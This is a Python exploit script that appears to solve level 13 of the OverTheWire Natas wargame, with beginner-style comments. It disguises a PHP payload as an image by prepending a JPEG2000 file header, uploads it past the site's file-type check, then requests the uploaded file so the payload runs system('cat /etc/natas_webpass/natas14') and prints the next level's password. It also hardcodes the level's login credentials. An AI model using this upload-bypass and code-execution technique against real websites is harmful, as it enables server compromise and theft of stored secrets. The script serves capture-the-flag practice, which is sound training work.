#!/usr/bin/env python
#thanks to https://github.com/andigena/natas/blob/master/natas13.py
import re
import requests

url = 'http://natas13.natas.labs.overthewire.org/'
#url is a string
jp2_header = [0x00, 0x00, 0x00, 0x0c, 0x6a, 0x50, 0x20, 0x20, 0x0d, 0x0a, 0x87, 0x0a]
#jp2_header is a list
jp2_header = ''.join([chr(i) for i in jp2_header])
#''.join() need to convert list to string
php_payload = r'''<?php
    echo "OK google\n";
    system("cat /etc/natas_webpass/natas14");
    echo "OK google\n";
?>'''
# =r it's a input
files = {'uploadedfile': ('file.php', jp2_header + php_payload)}
#files is a dictionaries
data = dict(filename='file.php')
auth = ('natas13', 'jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY')
r = requests.post(url, auth=auth, files=files, data=data)
try:
#try: - handle exeption
    uploaded_file = re.findall('''(upload/\S{10}.php)''', r.content)[0]
    print 'Uploaded file: ', uploaded_file
    r = requests.get(url + uploaded_file, auth=auth)
except IndexError as ie:
    pass

print r.content
